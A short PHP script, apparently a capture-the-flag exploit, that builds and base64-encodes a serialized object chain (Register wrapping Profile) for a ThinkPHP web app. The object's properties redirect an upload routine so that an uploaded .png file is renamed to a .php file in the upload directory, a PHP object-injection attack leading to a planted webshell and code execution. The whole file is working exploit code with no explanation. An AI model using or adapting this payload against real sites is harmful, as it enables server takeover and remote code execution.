<?php
namespace app\web\controller;
require __DIR__ . '/tp5/thinkphp/base.php';
use think\Controller;

class Register
{
    public $checker;
    public function __construct()
    {
        $this->checker = new Profile();
    }
}
class Profile
{
    public $except;
    public $filename;
    public $filename_tmp;
    public $ext;
    public $checker;
    public function __construct()
    {
        $this->filename="../public/upload/98acc62aa02eda032d1caed497ce72a0/6d74cc7548a0ddef1eafc6a6224e9d43.php";
        $this->filename_tmp = "../public/upload/98acc62aa02eda032d1caed497ce72a0/6d74cc7548a0ddef1eafc6a6224e9d43.png";
        $this->ext = "1";
        $this->checker = "0";
        $this->except=array("index"=>"upload_img");
    }

}
echo base64_encode((serialize(new Register())));
?>